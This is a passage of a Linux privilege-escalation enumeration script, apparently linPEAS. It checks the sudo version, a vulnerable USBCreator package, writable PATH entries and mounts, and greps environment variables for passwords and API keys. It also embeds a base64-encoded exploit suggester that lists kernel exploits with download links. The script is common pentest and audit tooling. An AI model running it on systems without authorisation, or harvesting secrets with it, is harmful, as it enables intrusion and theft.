if [ "$MACPEAS" ]; then
    warn_exec system_profiler SPSoftwareDataType
fi
echo ""

#-- SY) Sudo
print_2title "Sudo version"
if [ "$(command -v sudo 2>/dev/null)" ]; then
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version"
sudo -V 2>/dev/null | grep "Sudo ver" | sed -${E} "s,$sudovB,${SED_RED},"
else echo_not_found "sudo"
fi
echo ""

#--SY) USBCreator
if (busctl list 2>/dev/null | grep -q com.ubuntu.USBCreator) || [ "$DEBUG" ]; then
    print_2title "USBCreator"
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation"

    pc_version=$(dpkg -l 2>/dev/null | grep policykit-desktop-privileges | grep -oP "[0-9][0-9a-zA-Z\.]+")
    if [ -z "$pc_version" ]; then
        pc_version=$(apt-cache policy policykit-desktop-privileges 2>/dev/null | grep -oP "\*\*\*.*" | cut -d" " -f2)
    fi
    if [ -n "$pc_version" ]; then
        pc_length=${#pc_version}
        pc_major=$(echo "$pc_version" | cut -d. -f1)
        pc_minor=$(echo "$pc_version" | cut -d. -f2)
        if [ "$pc_length" -eq 4 ] && [ "$pc_major" -eq 0 ] && [ "$pc_minor"  -lt 21 ]; then
            echo "Vulnerable!!" | sed -${E} "s,.*,${SED_RED},"
        fi
    fi
fi
echo ""

#-- SY) PATH

print_2title "PATH"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses"
if ! [ "$IAMROOT" ]; then
    echo "$OLDPATH" 2>/dev/null | sed -${E} "s,$Wfolders|\./|\.:|:\.,${SED_RED_YELLOW},g"
fi

if [ "$DEBUG" ]; then
     echo "New path exported: $PATH"
fi
echo ""

#-- SY) Date
print_2title "Date & uptime"
warn_exec date 2>/dev/null
warn_exec uptime 2>/dev/null
echo ""

#-- SY) System stats
if [ "$EXTRA_CHECKS" ]; then
    print_2title "System stats"
    (df -h || lsblk) 2>/dev/null || echo_not_found "df and lsblk"
    warn_exec free 2>/dev/null
    echo ""
fi

#-- SY) CPU info
if [ "$EXTRA_CHECKS" ]; then
    print_2title "CPU info"
    warn_exec lscpu 2>/dev/null
    echo ""
fi

if [ -d "/dev" ] || [ "$DEBUG" ] ; then
    print_2title "Any sd*/disk* disk in /dev? (limit 20)"
    ls /dev 2>/dev/null | grep -Ei "^sd|^disk" | sed "s,crypt,${SED_RED}," | head -n 20
    echo ""
fi

if [ -f "/etc/fstab" ] || [ "$DEBUG" ]; then
    print_2title "Unmounted file-system?"
    print_info "Check if you can mount umounted devices"
    grep -v "^#" /etc/fstab 2>/dev/null | grep -Ev "\W+\#|^#" | sed -${E} "s,$mountG,${SED_GREEN},g" | sed -${E} "s,$notmounted,${SED_RED},g" | sed -${E} "s%$mounted%${SED_BLUE}%g" | sed -${E} "s,$Wfolders,${SED_RED}," | sed -${E} "s,$mountpermsB,${SED_RED},g" | sed -${E} "s,$mountpermsG,${SED_GREEN},g"
    echo ""
fi

if ([ "$(command -v diskutil)" ] || [ "$DEBUG" ]) && [ "$EXTRA_CHECKS" ]; then
    print_2title "Mounted disks information"
    warn_exec diskutil list
    echo ""
fi

if [ "$(command -v smbutil)" ] || [ "$DEBUG" ]; then
    print_2title "Mounted SMB Shares"
    warn_exec smbutil statshares -a
    echo ""
fi

#-- SY) Environment vars
print_2title "Environment"
print_info "Any private information inside environment variables?"
(env || printenv || set) 2>/dev/null | grep -v "RELEVANT*|FIND*|^VERSION=|dbuslistG|mygroups|ldsoconfdG|pwd_inside_history|kernelDCW_Ubuntu_Precise|kernelDCW_Ubuntu_Trusty|kernelDCW_Ubuntu_Xenial|kernelDCW_Rhel|^sudovB=|^rootcommon=|^mounted=|^mountG=|^notmounted=|^mountpermsB=|^mountpermsG=|^kernelB=|^C=|^RED=|^GREEN=|^Y=|^B=|^NC=|TIMEOUT=|groupsB=|groupsVB=|knw_grps=|sidG|sidB=|sidVB=|sidVB2=|sudoB=|sudoG=|sudoVB=|timersG=|capsB=|notExtensions=|Wfolders=|writeB=|writeVB=|_usrs=|compiler=|PWD=|LS_COLORS=|pathshG=|notBackup=|processesDump|processesB|commonrootdirs|USEFUL_SOFTWARE|PSTORAGE_KUBERNETES" | sed -${E} "s,[pP][wW][dD]|[pP][aA][sS][sS][wW]|[aA][pP][iI][kK][eE][yY]|[aA][pP][iI][_][kK][eE][yY]|KRB5CCNAME,${SED_RED},g" || echo_not_found "env || set"
echo ""

#-- SY) Dmesg
if [ "$(command -v dmesg 2>/dev/null)" ] || [ "$DEBUG" ]; then
    print_2title "Searching Signature verification failed in dmesg"
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed"
    (dmesg 2>/dev/null | grep "signature") || echo_not_found "dmesg"
    echo ""
fi

#-- SY) Kernel extensions
if [ "$MACPEAS" ]; then
    print_2title "Kernel Extensions not belonging to apple"
    kextstat 2>/dev/null | grep -Ev " com.apple."

    print_2title "Unsigned Kernel Extensions"
    macosNotSigned /Library/Extensions
    macosNotSigned /System/Library/Extensions
fi

if [ "$(command -v bash 2>/dev/null)" ]; then
    print_2title "Executing Linux Exploit Suggester"
    print_info "https://github.com/mzet-/linux-exploit-suggester"
    les_b64="IyEvYmluL2Jhc2gKCiMKIyBDb3B5cmlnaHQgKGMpIDIwMTYtMjAyMywgaHR0cHM6Ly9naXRodWIuY29tL216ZXQtCiMKIyBsaW51eC1leHBsb2l0LXN1Z2dlc3Rlci5zaCBjb21lcyB3aXRoIEFCU09MVVRFTFkgTk8gV0FSUkFOVFkuCiMgVGhpcyBpcyBmcmVlIHNvZnR3YXJlLCBhbmQgeW91IGFyZSB3ZWxjb21lIHRvIHJlZGlzdHJpYnV0ZSBpdAojIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UuIFNlZSBMSUNFTlNFCiMgZmlsZSBmb3IgdXNhZ2Ugb2YgdGhpcyBzb2Z0d2FyZS4KIwoKVkVSU0lPTj12MS4xCgojIGJhc2ggY29sb3JzCiN0eHRyZWQ9IlxlWzA7MzFtIgp0eHRyZWQ9IlxlWzkxOzFtIgp0eHRncm49IlxlWzE7MzJtIgp0eHRncmF5PSJcZVswOzM3bSIKdHh0Ymx1PSJcZVswOzM2bSIKdHh0cnN0PSJcZVswbSIKYmxkd2h0PSdcZVsxOzM3bScKd2h0PSdcZVswOzM2bScKYmxkYmx1PSdcZVsxOzM0bScKeWVsbG93PSdcZVsxOzkzbScKbGlnaHR5ZWxsb3c9J1xlWzA7OTNtJwoKIyBpbnB1dCBkYXRhClVOQU1FX0E9IiIKCiMgcGFyc2VkIGRhdGEgZm9yIGN1cnJlbnQgT1MKS0VSTkVMPSIiCk9TPSIiCkRJU1RSTz0iIgpBUkNIPSIiClBLR19MSVNUPSIiCgojIGtlcm5lbCBjb25maWcKS0NPTkZJRz0iIgoKQ1ZFTElTVF9GSUxFPSIiCgpvcHRfZmV0Y2hfYmlucz1mYWxzZQpvcHRfZmV0Y2hfc3Jjcz1mYWxzZQpvcHRfa2VybmVsX3ZlcnNpb249ZmFsc2UKb3B0X3VuYW1lX3N0cmluZz1mYWxzZQpvcHRfcGtnbGlzdF9maWxlPWZhbHNlCm9wdF9jdmVsaXN0X2ZpbGU9ZmFsc2UKb3B0X2NoZWNrc2VjX21vZGU9ZmFsc2UKb3B0X2Z1bGw9ZmFsc2UKb3B0X3N1bW1hcnk9ZmFsc2UKb3B0X2tlcm5lbF9vbmx5PWZhbHNlCm9wdF91c2Vyc3BhY2Vfb25seT1mYWxzZQpvcHRfc2hvd19kb3M9ZmFsc2UKb3B0X3NraXBfbW9yZV9jaGVja3M9ZmFsc2UKb3B0X3NraXBfcGtnX3ZlcnNpb25zPWZhbHNlCgpBUkdTPQpTSE9SVE9QVFM9ImhWZmJzdTprOmRwOmciCkxPTkdPUFRTPSJoZWxwLHZlcnNpb24sZnVsbCxmZXRjaC1iaW5hcmllcyxmZXRjaC1zb3VyY2VzLHVuYW1lOixrZXJuZWw6LHNob3ctZG9zLHBrZ2xpc3QtZmlsZTosc2hvcnQsa2VybmVsc3BhY2Utb25seSx1c2Vyc3BhY2Utb25seSxza2lwLW1vcmUtY2hlY2tzLHNraXAtcGtnLXZlcnNpb25zLGN2ZWxpc3QtZmlsZTosY2hlY2tzZWMiCgojIyBleHBsb2l0cyBkYXRhYmFzZQpkZWNsYXJlIC1hIEVYUExPSVRTCmRlY2xhcmUgLWEgRVhQTE9JVFNfVVNFUlNQQUNFCgojIyB0ZW1wb3JhcnkgYXJyYXkgZm9yIHB1cnBvc2Ugb2Ygc29ydGluZyBleHBsb2l0cyAoYmFzZWQgb24gZXhwbG9pdHMnIHJhbmspCmRlY2xhcmUgLWEgZXhwbG9pdHNfdG9fc29ydApkZWNsYXJlIC1hIFNPUlRFRF9FWFBMT0lUUwoKIyMjIyMjIyMjIyMjIExJTlVYIEtFUk5FTFNQQUNFIEVYUExPSVRTICMjIyMjIyMjIyMjIyMjIyMjIyMjCm49MAoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA0LTEyMzVdJHt0eHRyc3R9IGVsZmxibApSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj0yLjQuMjkKVGFnczoKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly9pc2VjLnBsL3Z1bG5lcmFiaWxpdGllcy9pc2VjLTAwMjEtdXNlbGliLnR4dApiaW4tdXJsOiBodHRwczovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxMTExMDMwNDI5MDQvaHR0cDovL3RhcmFudHVsYS5ieS5ydS9sb2NhbHJvb3QvMi42LngvZWxmbGJsCmV4cGxvaXQtZGI6IDc0NApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA0LTEyMzVdJHt0eHRyc3R9IHVzZWxpYigpClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPTIuNC4yOQpUYWdzOgpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL2lzZWMucGwvdnVsbmVyYWJpbGl0aWVzL2lzZWMtMDAyMS11c2VsaWIudHh0CmV4cGxvaXQtZGI6IDc3OApDb21tZW50czogS25vd24gdG8gd29yayBvbmx5IGZvciAyLjQgc2VyaWVzIChldmVuIHRob3VnaCAyLjYgaXMgYWxzbyB2dWxuZXJhYmxlKQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA0LTEyMzVdJHt0eHRyc3R9IGtyYWQzClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuNSx2ZXI8PTIuNi4xMQpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDEzOTcKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwNC0wMDc3XSR7dHh0cnN0fSBtcmVtYXBfcHRlClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMCx2ZXI8PTIuNi4yClRhZ3M6ClJhbms6IDEKZXhwbG9pdC1kYjogMTYwCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDYtMjQ1MV0ke3R4dHJzdH0gcmFwdG9yX3ByY3RsClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTMsdmVyPD0yLjYuMTcKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiAyMDMxCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDYtMjQ1MV0ke3R4dHJzdH0gcHJjdGwKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4xMyx2ZXI8PTIuNi4xNwpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDIwMDQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwNi0yNDUxXSR7dHh0cnN0fSBwcmN0bDIKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4xMyx2ZXI8PTIuNi4xNwpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDIwMDUKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwNi0yNDUxXSR7dHh0cnN0fSBwcmN0bDMKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4xMyx2ZXI8PTIuNi4xNwpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDIwMDYKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwNi0yNDUxXSR7dHh0cnN0fSBwcmN0bDQKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4xMyx2ZXI8PTIuNi4xNwpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDIwMTEKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwNi0zNjI2XSR7dHh0cnN0fSBoMDBseXNoaXQKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi44LHZlcjw9Mi42LjE2ClRhZ3M6ClJhbms6IDEKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTExMTAzMDQyOTA0L2h0dHA6Ly90YXJhbnR1bGEuYnkucnUvbG9jYWxyb290LzIuNi54L2gwMGx5c2hpdApleHBsb2l0LWRiOiAyMDEzCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDgtMDYwMF0ke3R4dHJzdH0gdm1zcGxpY2UxClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTcsdmVyPD0yLjYuMjQKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiA1MDkyCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDgtMDYwMF0ke3R4dHJzdH0gdm1zcGxpY2UyClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMjMsdmVyPD0yLjYuMjQKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiA1MDkzCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDgtNDIxMF0ke3R4dHJzdH0gZnRyZXgKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4xMSx2ZXI8PTIuNi4yMgpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDY4NTEKQ29tbWVudHM6IHdvcmxkLXdyaXRhYmxlIHNnaWQgZGlyZWN0b3J5IGFuZCBzaGVsbCB0aGF0IGRvZXMgbm90IGRyb3Agc2dpZCBwcml2cyB1cG9uIGV4ZWMgKGFzaC9zYXNoKSBhcmUgcmVxdWlyZWQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwOC00MjEwXSR7dHh0cnN0fSBleGl0X25vdGlmeQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjI1LHZlcjw9Mi42LjI5ClRhZ3M6ClJhbms6IDEKZXhwbG9pdC1kYjogODM2OQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTI2OTJdJHt0eHRyc3R9IHNvY2tfc2VuZHBhZ2UgKHNpbXBsZSB2ZXJzaW9uKQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjAsdmVyPD0yLjYuMzAKVGFnczogdWJ1bnR1PTcuMTAsUkhFTD00LGZlZG9yYT00fDV8Nnw3fDh8OXwxMHwxMQpSYW5rOiAxCmV4cGxvaXQtZGI6IDk0NzkKQ29tbWVudHM6IFdvcmtzIGZvciBzeXN0ZW1zIHdpdGggL3Byb2Mvc3lzL3ZtL21tYXBfbWluX2FkZHIgZXF1YWwgdG8gMApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTI2OTIsQ1ZFLTIwMDktMTg5NV0ke3R4dHJzdH0gc29ja19zZW5kcGFnZQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjAsdmVyPD0yLjYuMzAKVGFnczogdWJ1bnR1PTkuMDQKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8veG9ybC53b3JkcHJlc3MuY29tLzIwMDkvMDcvMTYvY3ZlLTIwMDktMTg5NS1saW51eC1rZXJuZWwtcGVyX2NsZWFyX29uX3NldGlkLXBlcnNvbmFsaXR5LWJ5cGFzcy8Kc3JjLXVybDogaHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlLWJpbi1zcGxvaXRzL3Jhdy9tYXN0ZXIvYmluLXNwbG9pdHMvOTQzNS50Z3oKZXhwbG9pdC1kYjogOTQzNQpDb21tZW50czogL3Byb2Mvc3lzL3ZtL21tYXBfbWluX2FkZHIgbmVlZHMgdG8gZXF1YWwgMCBPUiBwdWxzZWF1ZGlvIG5lZWRzIHRvIGJlIGluc3RhbGxlZApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTI2OTIsQ1ZFLTIwMDktMTg5NV0ke3R4dHJzdH0gc29ja19zZW5kcGFnZTIKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4wLHZlcjw9Mi42LjMwClRhZ3M6IApSYW5rOiAxCnNyYy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS1iaW4tc3Bsb2l0cy9yYXcvbWFzdGVyL2Jpbi1zcGxvaXRzLzk0MzYudGd6CmV4cGxvaXQtZGI6IDk0MzYKQ29tbWVudHM6IFdvcmtzIGZvciBzeXN0ZW1zIHdpdGggL3Byb2Mvc3lzL3ZtL21tYXBfbWluX2FkZHIgZXF1YWwgdG8gMApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTI2OTIsQ1ZFLTIwMDktMTg5NV0ke3R4dHJzdH0gc29ja19zZW5kcGFnZTMKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4wLHZlcjw9Mi42LjMwClRhZ3M6IApSYW5rOiAxCnNyYy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS1iaW4tc3Bsb2l0cy9yYXcvbWFzdGVyL2Jpbi1zcGxvaXRzLzk2NDEudGFyLmd6CmV4cGxvaXQtZGI6IDk2NDEKQ29tbWVudHM6IC9wcm9jL3N5cy92bS9tbWFwX21pbl9hZGRyIG5lZWRzIHRvIGVxdWFsIDAgT1IgcHVsc2VhdWRpbyBuZWVkcyB0byBiZSBpbnN0YWxsZWQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwOS0yNjkyLENWRS0yMDA5LTE4OTVdJHt0eHRyc3R9IHNvY2tfc2VuZHBhZ2UgKHBwYykKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4wLHZlcjw9Mi42LjMwClRhZ3M6IHVidW50dT04LjEwLFJIRUw9NHw1ClJhbms6IDEKZXhwbG9pdC1kYjogOTU0NQpDb21tZW50czogL3Byb2Mvc3lzL3ZtL21tYXBfbWluX2FkZHIgbmVlZHMgdG8gZXF1YWwgMApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTI2OThdJHt0eHRyc3R9IHRoZSByZWJlbCAodWRwX3NlbmRtc2cpClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMSx2ZXI8PTIuNi4xOQpUYWdzOiBkZWJpYW49NApSYW5rOiAxCnNyYy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS1iaW4tc3Bsb2l0cy9yYXcvbWFzdGVyL2Jpbi1zcGxvaXRzLzk1NzQudGd6CmV4cGxvaXQtZGI6IDk1NzQKYW5hbHlzaXMtdXJsOiBodHRwczovL2Jsb2cuY3IwLm9yZy8yMDA5LzA4L2N2ZS0yMDA5LTI2OTgtdWRwc2VuZG1zZy12dWxuZXJhYmlsaXR5Lmh0bWwKYXV0aG9yOiBzcGVuZGVyCkNvbW1lbnRzOiAvcHJvYy9zeXMvdm0vbW1hcF9taW5fYWRkciBuZWVkcyB0byBlcXVhbCAwIE9SIHB1bHNlYXVkaW8gbmVlZHMgdG8gYmUgaW5zdGFsbGVkCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDktMjY5OF0ke3R4dHJzdH0gaG9hZ2llX3VkcF9zZW5kbXNnClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMSx2ZXI8PTIuNi4xOSx4ODYKVGFnczogZGViaWFuPTQKUmFuazogMQpleHBsb2l0LWRiOiA5NTc1CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9ibG9nLmNyMC5vcmcvMjAwOS8wOC9jdmUtMjAwOS0yNjk4LXVkcHNlbmRtc2ctdnVsbmVyYWJpbGl0eS5odG1sCmF1dGhvcjogYW5kaQpDb21tZW50czogV29ya3MgZm9yIHN5c3RlbXMgd2l0aCAvcHJvYy9zeXMvdm0vbW1hcF9taW5fYWRkciBlcXVhbCB0byAwCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDktMjY5OF0ke3R4dHJzdH0ga2F0b24gKHVkcF9zZW5kbXNnKQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjEsdmVyPD0yLjYuMTkseDg2ClRhZ3M6IGRlYmlhbj00ClJhbms6IDEKc3JjLXVybDogaHR0cHM6Ly9naXRodWIuY29tL0thYm90L1VuaXgtUHJpdmlsZWdlLUVzY2FsYXRpb24tRXhwbG9pdHMtUGFjay9yYXcvbWFzdGVyLzIwMDkvQ1ZFLTIwMDktMjY5OC9rYXRvbi5jCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9ibG9nLmNyMC5vcmcvMjAwOS8wOC9jdmUtMjAwOS0yNjk4LXVkcHNlbmRtc2ctdnVsbmVyYWJpbGl0eS5odG1sCmF1dGhvcjogVnhIZWxsIExhYnMKQ29tbWVudHM6IFdvcmtzIGZvciBzeXN0ZW1zIHdpdGggL3Byb2Mvc3lzL3ZtL21tYXBfbWluX2FkZHIgZXF1YWwgdG8gMApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTI2OThdJHt0eHRyc3R9IGlwX2FwcGVuZF9kYXRhClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMSx2ZXI8PTIuNi4xOSx4ODYKVGFnczogZmVkb3JhPTR8NXw2LFJIRUw9NApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9ibG9nLmNyMC5vcmcvMjAwOS8wOC9jdmUtMjAwOS0yNjk4LXVkcHNlbmRtc2ctdnVsbmVyYWJpbGl0eS5odG1sCmV4cGxvaXQtZGI6IDk1NDIKYXV0aG9yOiBwMGM3M24xCkNvbW1lbnRzOiBXb3JrcyBmb3Igc3lzdGVtcyB3aXRoIC9wcm9jL3N5cy92bS9tbWFwX21pbl9hZGRyIGVxdWFsIHRvIDAKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwOS0zNTQ3XSR7dHh0cnN0fSBwaXBlLmMgMQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjAsdmVyPD0yLjYuMzEKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiAzMzMyMQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTM1NDddJHt0eHRyc3R9IHBpcGUuYyAyClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMCx2ZXI8PTIuNi4zMQpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDMzMzIyCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDktMzU0N10ke3R4dHJzdH0gcGlwZS5jIDMKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4wLHZlcjw9Mi42LjMxClRhZ3M6ClJhbms6IDEKZXhwbG9pdC1kYjogMTAwMTgKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMC0zMzAxXSR7dHh0cnN0fSBwdHJhY2Vfa21vZDIKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4yNix2ZXI8PTIuNi4zNApUYWdzOiBkZWJpYW49Ni4we2tlcm5lbDoyLjYuKDMyfDMzfDM0fDM1KS0oMXwyfHRydW5rKS1hbWQ2NH0sdWJ1bnR1PSgxMC4wNHwxMC4xMCl7a2VybmVsOjIuNi4oMzJ8MzUpLSgxOXwyMXwyNCktc2VydmVyfQpSYW5rOiAxCmJpbi11cmw6IGh0dHBzOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDExMTEwMzA0MjkwNC9odHRwOi8vdGFyYW50dWxhLmJ5LnJ1L2xvY2Fscm9vdC8yLjYueC9rbW9kMgpiaW4tdXJsOiBodHRwczovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxMTExMDMwNDI5MDQvaHR0cDovL3RhcmFudHVsYS5ieS5ydS9sb2NhbHJvb3QvMi42LngvcHRyYWNlLWttb2QKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjQxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvcHRyYWNlX2ttb2QyLTY0CmV4cGxvaXQtZGI6IDE1MDIzCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTAtMTE0Nl0ke3R4dHJzdH0gcmVpc2VyZnMKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4xOCx2ZXI8PTIuNi4zNApUYWdzOiB1YnVudHU9OS4xMApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9qb24ub2JlcmhlaWRlLm9yZy9ibG9nLzIwMTAvMDQvMTAvcmVpc2VyZnMtcmVpc2VyZnNfcHJpdi12dWxuZXJhYmlsaXR5LwpzcmMtdXJsOiBodHRwczovL2pvbi5vYmVyaGVpZGUub3JnL2ZpbGVzL3RlYW0tZWR3YXJkLnB5CmV4cGxvaXQtZGI6IDEyMTMwCmNvbW1lbnRzOiBSZXF1aXJlcyBhIFJlaXNlckZTIGZpbGVzeXN0ZW0gbW91bnRlZCB3aXRoIGV4dGVuZGVkIGF0dHJpYnV0ZXMKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMC0yOTU5XSR7dHh0cnN0fSBjYW5fYmNtClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTgsdmVyPD0yLjYuMzYKVGFnczogdWJ1bnR1PTEwLjA0e2tlcm5lbDoyLjYuMzItMjQtZ2VuZXJpY30KUmFuazogMQpiaW4tdXJsOiBodHRwczovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxNjA2MDIxOTI2NDEvaHR0cHM6Ly93d3cua2VybmVsLWV4cGxvaXRzLmNvbS9tZWRpYS9jYW5fYmNtCmV4cGxvaXQtZGI6IDE0ODE0CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTAtMzkwNF0ke3R4dHJzdH0gcmRzClJlcXM6IHBr